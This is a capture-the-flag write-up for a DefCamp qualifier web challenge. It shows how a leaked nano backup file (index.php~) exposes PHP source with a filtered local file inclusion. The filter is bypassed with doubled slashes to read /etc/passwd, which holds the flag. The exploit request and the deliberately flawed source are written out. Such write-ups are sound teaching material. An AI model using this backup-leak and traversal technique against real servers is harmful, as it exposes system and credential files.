WEB 1 :
-------


Is nano good? (Junior - 2 pcts.)
--------------------------------




----------


This is our new admin platform interface. Can you test it? 
[Visit website](https://junior2.dctf-quals-17.def.camp/?page=theme/admin/login) 


----------


https://junior2.dctf-quals-17.def.camp/?page=theme/admin/login



from title of the challenge (nano) , I added ~ to index.php 


https://junior2.dctf-quals-17.def.camp/index.php~ 



i get the source code of the page 




```php

<?php
$page = $_GET["page"];
$type = $_GET["type"];
if (strpos($page, './../') !== false){
	header("Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
	die();
}

if (strpos($page, '..././') !== false){
	header("Location: http://leekspin.com/");
	die();
}

if (strpos($page, '%') !== false){
	header("Location: http://www.nyan.cat/");
	die();
}

if (strpos($page, 'fille') !== false){
	header("Location: https://www.youtube.com/watch?v=o1eHKf-dMwo");
	die();
}

if (strpos($page, '/etc/passwd') === 0) {
	header("Location: https://www.youtube.com/watch?v=djV11Xbc914");
	die();
}
# I wonder if I can bypass path traversal restriction by going back and forward within the directorys....
if ($type == ""){
	echo file_get_contents($page.".php");
} else {
	#maybe we need something from the website 
	echo file_get_contents($page); 
}
?>

```



by this source we see LFI and filtres on $page and conditions , 

/ = //

type = value

 parameters :

https://junior2.dctf-quals-17.def.camp/?type=a&page=//etc//passwd



    DCTF{7569fd:x:1001:1001::/home/DCTF{7569fd: 4bf5b7ded2f:x:1002:1002::/home/4bf5b7ded2f: c48b33a7972:x:1003:1003::/home/c48b33a7972: c0752d13db4:x:1004:1004::/home/c0752d13db4: 32ff9930a99:x:1005:1005::/home/32ff9930a99: 6c567ea3321:x:1006:1006::/home/6c567ea3321: 13b}:x:1007:1007::/home/13b}: 

flag : 
DCTF{7569fd4bf5b7ded2fc48b33a7972c0752d13db432ff9930a996c567ea332113b}


